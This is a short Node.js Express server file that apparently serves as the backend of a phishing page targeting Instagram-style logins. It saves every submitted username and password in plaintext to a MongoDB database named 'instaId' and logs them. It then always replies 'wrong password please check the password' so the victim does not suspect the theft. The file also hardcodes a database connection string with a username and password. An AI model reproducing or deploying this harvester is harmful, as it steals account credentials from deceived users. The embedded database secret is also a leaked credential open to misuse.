// app.js

const express = require('express');
const mongoose = require('mongoose');
const cors = require('cors');

const app = express();
const port = 8000;


app.use(cors());
// Connect to MongoDB
mongoose.connect('mongodb+srv://kayumkhan:kayumkhan2004@cluster0.ctdsalv.mongodb.net/instaId');

// Define a Mongoose model
const User = mongoose.model('User', {
  name: String,
  pass: String,
});

// Middleware to parse JSON
app.use(express.json());

// Route to handle user registration
app.post('/send', async (req, res) => {
  const { name, pass } = req.body;
console.log(name,pass)
  try {
    // Create a new user
    const newUser = new User({ name, pass });
    
    // Save the user to the database
    await newUser.save();

    res.status(201).json({ message: 'wrong password please check the password' });
  } catch (error) {
    console.error(error);
    res.status(500).json({ message: 'Internal Server Error' });
  }
});

// Start the server
app.listen(port, () => {
  console.log(`Server is running on http://localhost:${port}`);
});
